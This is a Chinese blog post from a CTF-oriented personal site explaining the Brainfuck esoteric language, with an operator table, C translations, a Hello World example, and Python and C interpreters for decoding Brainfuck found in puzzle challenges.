                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/Brainfuck/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          

          
          
             <span id="/2017/01/22/Brainfuck/" class="leancloud_visitors" data-flag-title="Brainfuck">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>一些隐写题中可能会出此现这种东西，下面我来大概介绍一下：</p>
<p>官方网站: <a href="http://www.muppetlabs.com/~breadbox/bf/" target="_blank" rel="external">http://www.muppetlabs.com/~breadbox/bf/</a></p>
<p>BrainFuck, (An Eight-Instruction Turing-Complete Programming Language), 这个语言本身的语言模型很简单, 有一个byte指针, 有一个初始化为0长度为30000 bytes的数组, byte指针可以在数组内任意移动, 支持下面的八种操作, 指针初始化指向数组的开始. 这个语言只是作者为了写一个很简单的编译器, 才设计的一门语言, 语言和名字一样, 很难读懂, 简单的一些操作用BrainFuck来写都很复杂难读.</p>
<p>八种操作符定义如下:</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>&gt;</td>
<td>指针加一</td>
</tr>
<tr>
<td>&lt;</td>
<td>指针减一</td>
</tr>
<tr>
<td>+</td>
<td>指针指向的字节的值加一</td>
</tr>
<tr>
<td>-</td>
<td>指针指向的字节的值减一</td>
</tr>
<tr>
<td>.</td>
<td>输出指针指向的单元内容（ASCII码）</td>
</tr>
<tr>
<td>,</td>
<td>输入内容到指针指向的单元（ASCII码）</td>
</tr>
<tr>
<td>[</td>
<td>如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处</td>
</tr>
<tr>
<td>]</td>
<td>如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处</td>
</tr>
</tbody>
</table>
<p>Brainfuck程序可以用下面的替换方法翻译成C语言(假设ptr是char*类型)：</p>
<table>
<thead>
<tr>
<th>Brainfuck</th>
<th>C</th>
</tr>
</thead>
<tbody>
<tr>
<td>&gt;</td>
<td>++ptr;</td>
</tr>
<tr>
<td>&lt;</td>
<td>–ptr;</td>
</tr>
<tr>
<td>+</td>
<td>++*ptr;</td>
</tr>
<tr>
<td>-</td>
<td>–*ptr;</td>
</tr>
<tr>
<td>.</td>
<td>putchar(*ptr);</td>
</tr>
<tr>
<td>,</td>
<td>*ptr =getchar();</td>
</tr>
<tr>
<td>[</td>
<td>while (*ptr) {</td>
</tr>
<tr>
<td>]</td>
<td>}</td>
</tr>
</tbody>
</table>
<p>举个例子：</p>
<p><code>++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;++.&gt;+.+++++++..+++.&lt;&lt;++.&gt;+++++++++++++++.&gt;.+++.------.--------.&lt;&lt;+.&lt;.</code></p>
<p>这个编译后就是  ‘Hello World!’</p>
<p>其实只要工具就好了！！！<br>贴一个python实现的解释器：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os </div><div class="line"><span class="keyword">import</span> sys </div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">mainloop</span><span class="params">(program, bracket_map)</span>:</span> </div><div class="line">    pc = <span class="number">0</span> </div><div class="line">    tape = Tape() </div><div class="line">    <span class="keyword">while</span> pc &lt; len(program): </div><div class="line">        code = program[pc] </div><div class="line">        <span class="keyword">if</span> code == <span class="string">"&gt;"</span>: </div><div class="line">            tape.advance() </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"&lt;"</span>: </div><div class="line">            tape.devance() </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"+"</span>: </div><div class="line">            tape.inc() </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"-"</span>: </div><div class="line">            tape.dec() </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"."</span>: </div><div class="line">            <span class="comment"># print </span></div><div class="line">            os.write(<span class="number">1</span>, chr(tape.get())) </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">","</span>: </div><div class="line">            <span class="comment"># read from stdin </span></div><div class="line">            tape.set(ord(os.read(<span class="number">0</span>, <span class="number">1</span>)[<span class="number">0</span>])) </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"["</span> <span class="keyword">and</span> tape.get() == <span class="number">0</span>: </div><div class="line">            <span class="comment"># Skip forward to the matching ] </span></div><div class="line">            pc = bracket_map[pc] </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"]"</span> <span class="keyword">and</span> tape.get() != <span class="number">0</span>: </div><div class="line">            <span class="comment"># Skip back to the matching [ </span></div><div class="line">            pc = bracket_map[pc] </div><div class="line">        pc += <span class="number">1</span> </div><div class="line"> </div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tape</span><span class="params">(object)</span>:</span> </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span> </div><div class="line">        self.thetape = [<span class="number">0</span>] </div><div class="line">        self.position = <span class="number">0</span> </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span> </div><div class="line">        <span class="keyword">return</span> self.thetape[self.position] </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(self, val)</span>:</span> </div><div class="line">        self.thetape[self.position] = val </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inc</span><span class="params">(self)</span>:</span> </div><div class="line">        self.thetape[self.position] += <span class="number">1</span> </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(self)</span>:</span> </div><div class="line">        self.thetape[self.position] -= <span class="number">1</span> </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">advance</span><span class="params">(self)</span>:</span> </div><div class="line">        self.position += <span class="number">1</span> </div><div class="line">        <span class="keyword">if</span> len(self.thetape) &lt;= self.position: </div><div class="line">            self.thetape.append(<span class="number">0</span>) </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">devance</span><span class="params">(self)</span>:</span> </div><div class="line">        self.position -= <span class="number">1</span> </div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(program)</span>:</span> </div><div class="line">    parsed = [] </div><div class="line">    bracket_map = &#123;&#125; </div><div class="line">    leftstack = [] </div><div class="line">    pc = <span class="number">0</span> </div><div class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> program: </div><div class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> (<span class="string">'['</span>, <span class="string">']'</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>, <span class="string">'+'</span>, <span class="string">'-'</span>, <span class="string">','</span>, <span class="string">'.'</span>): </div><div class="line">            parsed.append(char) </div><div class="line">            <span class="keyword">if</span> char == <span class="string">'['</span>: </div><div class="line">                leftstack.append(pc) </div><div class="line">            <span class="keyword">elif</span> char == <span class="string">']'</span>: </div><div class="line">                left = leftstack.pop() </div><div class="line">                right = pc </div><div class="line">                bracket_map[left] = right </div><div class="line">                bracket_map[right] = left </div><div class="line">            pc += <span class="number">1</span> </div><div class="line">     </div><div class="line">    <span class="keyword">return</span> <span class="string">""</span>.join(parsed), bracket_map </div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(fp)</span>:</span> </div><div class="line">    program_contents = <span class="string">""</span> </div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>: </div><div class="line">        read = os.read(fp, <span class="number">4096</span>) </div><div class="line">        <span class="keyword">if</span> len(read) == <span class="number">0</span>: </div><div class="line">            <span class="keyword">break</span> </div><div class="line">        program_contents += read </div><div class="line">    os.close(fp) </div><div class="line">    program, bm = parse(program_contents) </div><div class="line">    mainloop(program, bm) </div><div class="line">     </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </div><div class="line">    run(os.open(sys.argv[<span class="number">1</span>], os.O_RDONLY, <span class="number">0777</span>))</div><div class="line"></div><div class="line"><span class="comment">#用法：python brain.py flag.br</span></div><div class="line"><span class="comment">#在.br文件中保存BrainFuck的代码</span></div></pre></td></tr></table></figure>
<p>c编写的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">include &lt;stdio.h&gt;;</div><div class="line"><span class="keyword">int</span>  p, r, q;</div><div class="line"><span class="keyword">char</span> a[<span class="number">5000</span>], f[<span class="number">5000</span>], b, o, *s=f;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">interpret</span><span class="params">(<span class="keyword">char</span> *c)</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">char</span> *d;</div><div class="line">        r++;</div><div class="line">        <span class="keyword">while</span>( *c ) &#123;</div><div class="line">                <span class="keyword">switch</span>(o=<span class="number">1</span>,*c++) &#123;</div><div class="line">                <span class="keyword">case</span> <span class="string">'&lt;'</span>: p--;        <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'&gt;'</span>: p++;        <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'+'</span>: a[p]++;     <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'-'</span>: a[p]--;     <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'.'</span>: <span class="built_in">putchar</span>(a[p]); fflush(<span class="built_in">stdout</span>); <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">','</span>: a[p]=getchar();fflush(<span class="built_in">stdout</span>); <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'['</span>:</div><div class="line">                        <span class="keyword">for</span>( b=<span class="number">1</span>,d=c; b &amp;&amp; *c; c++ )</div><div class="line">                                b+=*c==<span class="string">'['</span>, b-=*c==<span class="string">']'</span>;</div><div class="line">                        <span class="keyword">if</span>(!b) &#123;</div><div class="line">                                c[<span class="number">-1</span>]=<span class="number">0</span>;</div><div class="line">                                <span class="keyword">while</span>( a[p] )</div><div class="line">                                        interpret(d);</div><div class="line">                                c[<span class="number">-1</span>]=<span class="string">']'</span>;</div><div class="line">                                <span class="keyword">break</span>;</div><div class="line">                        &#125;</div><div class="line">                <span class="keyword">case</span> <span class="string">']'</span>:</div><div class="line">                        <span class="built_in">puts</span>(<span class="string">"UNBALANCED BRACKETS"</span>), <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">                <span class="keyword">case</span> <span class="string">'#'</span>:</div><div class="line">                        <span class="keyword">if</span>(q&gt;<span class="number">2</span>)</div><div class="line">                                <span class="built_in">printf</span>(<span class="string">"%2d %2d %2d %2d %2d %2d %2d %2d %2d %2d/n%*s/n"</span>,</div><div class="line">                                       *a,a[<span class="number">1</span>],a[<span class="number">2</span>],a[<span class="number">3</span>],a[<span class="number">4</span>],a[<span class="number">5</span>],a[<span class="number">6</span>],a[<span class="number">7</span>],a[<span class="number">8</span>],a[<span class="number">9</span>],<span class="number">3</span>*p+<span class="number">2</span>,<span class="string">"^"</span>);</div><div class="line">                        <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">default</span>: o=<span class="number">0</span>;</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">if</span>( p&lt;<span class="number">0</span> || p&gt;<span class="number">100</span>)</div><div class="line">                        <span class="built_in">puts</span>(<span class="string">"RANGE ERROR"</span>), <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">        &#125;</div><div class="line">        r--;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></div><div class="line">&#123;</div><div class="line">        FILE *z;</div><div class="line">        q=argc;</div><div class="line">         <span class="keyword">if</span>(z=fopen(argv[<span class="number">1</span>],<span class="string">"r"</span>)) &#123;</div><div class="line">                <span class="keyword">while</span>( (b=getc(z))&gt;<span class="number">0</span> )</div><div class="line">                        *s++=b;</div><div class="line">                *s=<span class="number">0</span>;</div><div class="line">                interpret(f);</div><div class="line">        &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>编译一下就可以用了。</p>
<p>嗯，就这些。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>


          
          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/avatar.gif"
               alt="ZEROYU" />
          <p class="site-author-name" itemprop="name">ZEROYU</p>
          <p class="site-description motion-element" itemprop="description">一只单线程HACKER</p>
        </div>
        <nav class="site-state motion-element">
        
          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">30</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          

          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/zer0yu" target="_blank" title="Github">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  Github
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://weibo.com/Z3r0yu" target="_blank" title="Weibo">
                  
                    <i class="fa fa-fw fa-weibo"></i>
                  
                  Weibo
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="zeroyu.xyz@gmail.com" target="_blank" title="Email">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  Email
                </a>
              </span>
            
          
        </div>

        
        

        
        
          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
            <div class="links-of-blogroll-title">
              <i class="fa  fa-fw fa-globe"></i>
              友情链接
            </div>
            <ul class="links-of-blogroll-list">
              
                <li class="links-of-blogroll-item">
                  <a href="http://blog.csdn.net/zeroyu_xyz" title="我的CSDN博客" target="_blank">我的CSDN博客</a>
                </li>
              
            </ul>
          </div>
        

        


      </section>

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2015 - 
  <span itemprop="copyrightYear">2017</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ZEROYU</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">ZEROYU</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Mist
  </a>
</div>


<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

<script>
(function(){
    var bp = document.createElement('script');
    bp.src = '//push.zhanzhang.baidu.com/push.js';
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  




  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  

  
    
  

  <script type="text/javascript">
    var duoshuoQuery = {short_name:"zeroyu.duoshuo.com"};
    (function() {
      var ds = document.createElement('script');
      ds.type = 'text/javascript';ds.async = true;
      ds.id = 'duoshuo-script';
      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
      ds.charset = 'UTF-8';
      (document.getElementsByTagName('head')[0]
      || document.getElementsByTagName('body')[0]).appendChild(ds);
    })();
  </script>

  
    
    
    <script src="/lib/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
    <script src="/js/src/hook-duoshuo.js"></script>
  












  
  
  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length == 0) {
      search_path = "search.xml";
    }
    var path = "/" + search_path;
    // monitor main search box;

    function proceedsearch() {
      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
      $('.popup').toggle();
    }
    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';
      $.ajax({
        url: path,
        dataType: "xml",
        async: true,
        success: function( xmlResponse ) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = $( "entry", xmlResponse ).map(function() {
            return {
              title: $( "title", this ).text(),
              content: $("content",this).text(),
              url: $( "url" , this).text()
            };
          }).get();
          var $input = document.getElementById(search_id);
          var $resultContent = document.getElementById(content_id);
          $input.addEventListener('input', function(){
            var matchcounts = 0;
            var str='<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length > 1) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var content_index = [];
                var data_title = data.title.trim().toLowerCase();
                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
                var data_url = decodeURIComponent(data.url);
                var index_title = -1;
                var index_content = -1;
                var first_occur = -1;
                // only match artiles with not empty titles and contents
                if(data_title != '') {
                  keywords.forEach(function(keyword, i) {
                    index_title = data_title.indexOf(keyword);
                    index_content = data_content.indexOf(keyword);
                    if( index_title >= 0 || index_content >= 0 ){
                      isMatch = true;
                      if (i == 0) {
                        first_occur = index_content;
                      }
                    }

                  });
                }
                // show search results
                if (isMatch) {
                  matchcounts += 1;
                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
                  var content = data.content.trim().replace(/<[^>]+>/g,"");
                  if (first_occur >= 0) {
                    // cut out 100 characters
                    var start = first_occur - 20;
                    var end = first_occur + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if(start == 0){
                      end = 50;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    var match_content = content.substring(start, end);
                    // highlight all keywords
                    keywords.forEach(function(keyword){
                      var regS = new RegExp(keyword, "gi");
                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
                    });

                    str += "<p class=\"search-result\">" + match_content +"...</p>"
                  }
                  str += "</li>";
                }
              })};
            str += "</ul>";
            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
            $resultContent.innerHTML = str;
          });
          proceedsearch();
        }
      });}

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched == false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(function(e){
      $('.popup').hide();
      $(".popoverlay").remove();
      $('body').css('overflow', '');
    });
    $('.popup').click(function(e){
      e.stopPropagation();
    });
  </script>


  

  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
  <script>AV.initialize("KY6fzHpNYVDAlWLyfhKdz5OA-gzGzoHsz", "IlxIqswmBd92jfiSvOIQSLf5");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  


</body>
</html>
